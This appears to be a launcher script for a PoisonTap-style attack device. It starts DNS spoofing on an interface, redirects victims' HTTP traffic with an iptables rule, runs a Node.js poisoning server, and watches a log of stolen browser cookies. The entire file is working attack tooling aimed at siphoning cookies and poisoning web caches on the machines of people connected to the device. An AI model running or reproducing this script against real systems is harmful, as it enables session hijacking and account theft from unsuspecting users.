#!/bin/bash

echo '[*] running cookies siphoning and web cache poisoning'

sleep 5 # after captive portal checks

if [ $(pgrep dnsspoof) = '' ]; then
  #screen -dmS dnsspoof dnsspoof -i "$1" port 53
  dnsspoof -i "$1" port 53 &
fi

if ! iptables -t nat -vnL PREROUTING | grep "$1" | grep -q ' 1337'; then
  iptables -t nat -A PREROUTING -i "$1" -p tcp --dport 80 -j REDIRECT --to-port 1337
fi

if [ $(pgrep -f pi_poisontap.js) = '' ]; then
  truncate -s 1 /opt/poisontap/poisontap.cookies.log
  #screen -dmS poisontap nodejs /opt/poisontap/pi_poisontap.js
  nodejs /opt/poisontap/pi_poisontap.js &
fi

tail -f /opt/poisontap/poisontap.cookies.log | while read line
do
	echo $line | grep 'Cookie:' --color=auto && led yellow on 2> /dev/null
done